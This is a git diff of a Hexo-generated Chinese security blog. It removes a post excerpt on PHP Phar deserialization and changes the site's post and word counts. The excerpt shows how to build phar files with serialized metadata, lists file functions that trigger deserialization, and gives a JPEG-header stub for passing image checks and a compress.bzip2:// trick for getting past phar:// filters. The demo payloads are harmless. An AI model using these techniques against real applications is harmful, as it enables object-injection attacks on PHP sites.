-<p>Phar归档文件最有特色的特点是可以方便地将多个文件分组为一个文件。这样，phar归档文件提供了一种将完整的PHP应用程序分发到单个文件中并从该文件运行它的方法，而无需将其提取到磁盘中。此外，PHP可以像在命令行上和从Web服务器上的任何其他文件一样轻松地执行phar存档。 Phar有点像PHP应用程序的拇指驱动器。（译文）</p>
-</blockquote>
-<ul>
-<li>简单理解就是他类似zip或者说类似jar，它将PHP文件打包成一个文件然后PHP可以在不解压的情况去访问这个包里面的php，并执行。<h3 id="Phar的结构"><a href="#Phar的结构" class="headerlink" title="Phar的结构"></a>Phar的结构</h3></li>
-</ul>
-<p><strong>1.</strong> <strong>phar文件标识</strong></p>
-<pre><code class="php">&lt;?php
-Phar::mapPhar();
-include &#39;phar://phar.phar/index.php&#39;;
-__HALT_COMPILER();
-?&gt;</code></pre>
-<p>​        格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
-<p><strong>2. a manifest describing the contents</strong><br>         phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
-<p><strong>3. the file contents</strong><br>         被压缩文件的内容。</p>
-<p><strong>4. [optional] a signature for verifying Phar integrity (phar file format only)</strong><br>         签名，放在文件末尾，格式如下：    </p>
-<h3 id="Phar的使用方法"><a href="#Phar的使用方法" class="headerlink" title="Phar的使用方法"></a>Phar的使用方法</h3><pre><code class="php">&lt;?php
-    class User{
-        var $name;
-        function __destruct(){
-            echo &quot;fangzhang&quot;;
-        }
-    }
-
-    @unlink(&quot;test.phar&quot;);
-    $phar = new Phar(&quot;test.phar&quot;);//后缀名必须为phar
-    $phar-&gt;startBuffering();
-    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);//设置stub
-    $o = new User();
-    $o-&gt;name = &quot;test&quot;;
-    $phar-&gt;setMetadata($o);//将自定义的meta-data存入manifest
-    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);//添加要压缩的文件
-    $phar-&gt;stopBuffering();
-?&gt;</code></pre>
-<p>得到的test.phar 内容如下：</p>
-<pre><code>00000000: 3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d  &lt;?php __HALT_COM
-00000010: 5049 4c45 5228 293b 203f 3e0d 0a5b 0000  PILER(); ?&gt;..[..
-00000020: 0001 0000 0011 0000 0001 0000 0000 0025  ...............%
-00000030: 0000 004f 3a34 3a22 5573 6572 223a 313a  ...O:4:&quot;User&quot;:1:
-00000040: 7b73 3a34 3a22 6e61 6d65 223b 733a 343a  {s:4:&quot;name&quot;;s:4:
-00000050: 2274 6573 7422 3b7d 0800 0000 7465 7374  &quot;test&quot;;}....test
-00000060: 2e74 7874 0400 0000 46fc 6e5d 0400 0000  .txt....F.n]....
-00000070: 0c7e 7fd8 b601 0000 0000 0000 7465 7374  .~..........test
-00000080: 9d18 4c48 ba24 6ed6 a810 3690 2aac 034e  ..LH.$n...6.*..N
-00000090: 6aee e818 0200 0000 4742 4d42            j.......GBMB</code></pre><p>可以看到，有一部分是序列化之后的内容，就是我们在上一部分所说的<code>manifest</code>也就是<code>meta-data</code></p>
-<h3 id="Phar反序列化原理"><a href="#Phar反序列化原理" class="headerlink" title="Phar反序列化原理"></a>Phar反序列化原理</h3><p>​        使用Phar://伪协议去读取Phar文件时候，文件会被当做phar对象，meta-data部分会被反序列化。</p>
-<h4 id="测试Dome"><a href="#测试Dome" class="headerlink" title="测试Dome"></a>测试Dome</h4><pre><code class="php">&lt;?php
-    class User{
-        var $name;
-        function __destruct(){
-            echo &quot;test&quot;;
-        }
-    }
-
-$file = &quot;phar://test.phar&quot;;
-@file_get_contents($file);
-?&gt;</code></pre>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="函数扩展"><a href="#函数扩展" class="headerlink" title="函数扩展"></a>函数扩展</h3><p>根据以上代码的测试可知，只要phar://协议解析文件的时候，就会造成序列化的问题，类似这样的函数不光有<code>file_get_contents</code>还有其他函数；</p>
-<p>有大牛曾经总结过，所有文件操作的函数都可以触发这种序列化：</p>
-<ul>
-<li><code>fileatime</code> / <code>filectime</code> / <code>filemtime</code></li>
-<li><code>stat</code> / <code>fileinode</code> / <code>fileowner</code> / <code>filegroup</code> / <code>fileperms</code></li>
-<li><code>file</code> / <code>file_get_contents</code> / <code>readfile</code> / `fopen``</li>
-<li><code>file_exists</code> / <code>is_dir</code> / <code>is_executable</code> / <code>is_file</code> / <code>is_link</code> / <code>is_readable</code> / <code>is_writeable</code> / <code>is_writable</code></li>
-<li><code>parse_ini_file</code></li>
-<li><code>unlink</code></li>
-<li><code>copy</code></li>
-</ul>
-<p>还有大牛深入的分析过这些函数的原理，并且加以扩展：</p>
-<ul>
-<li><code>exif_thumbnail</code></li>
-<li><code>exif_imagetype</code></li>
-<li><code>imageloadfont</code></li>
-<li><code>imagecreatefrom***</code></li>
-<li><code>hash_hmac_file</code></li>
-<li><code>hash_file</code></li>
-<li><code>hash_update_file</code></li>
-<li><code>md5_file</code></li>
-<li><code>sha1_file</code></li>
-<li><code>get_meta_tags</code></li>
-<li><code>get_headers</code></li>
-<li><code>getimagesize</code></li>
-<li><code>getimagesizefromstring</code></li>
-</ul>
-<p>几乎所有和IO有关的函数都涉及到了</p>
-<h3 id="绕过图片头检查"><a href="#绕过图片头检查" class="headerlink" title="绕过图片头检查"></a>绕过图片头检查</h3><pre><code class="php">&lt;?php
-class TestObject {}
-
-$jpeg_header_size = 
-&quot;\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13&quot;.
-&quot;\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02&quot;.
-&quot;\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15&quot;.
-&quot;\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14&quot;.
-&quot;\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01&quot;.
-&quot;\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03&quot;.
-&quot;\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11&quot;.
-&quot;\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20&quot;.
-&quot;\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01&quot;.
-&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00&quot;.
-&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda&quot;.
-&quot;\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9&quot;;
-
-$phar = new Phar(&quot;phar.phar&quot;);
-$phar-&gt;startBuffering();
-$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);
-$phar-&gt;setStub($jpeg_header_size.&quot; __HALT_COMPILER(); ?&gt;&quot;);
-$o = new TestObject();
-$phar-&gt;setMetadata($o);
-$phar-&gt;stopBuffering();</code></pre>
-<h3 id="限制使用phar：-出现位置"><a href="#限制使用phar：-出现位置" class="headerlink" title="限制使用phar：//出现位置"></a>限制使用phar：//出现位置</h3><pre><code class="php">$z = &#39;compress.bzip2://phar:///home/sx/test.phar/test.txt&#39;;</code></pre>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2638,7 +2444,7 @@ $phar-&gt;stopBuffering();</code></pre>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">77</span>
+          <span class="site-state-item-count">79</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2709,12 +2515,12 @@ $phar-&gt;stopBuffering();</code></pre>
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">287k</span>
+    <span title="站点总字数">292k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">4:21</span>
+    <span title="站点阅读时长">4:26</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
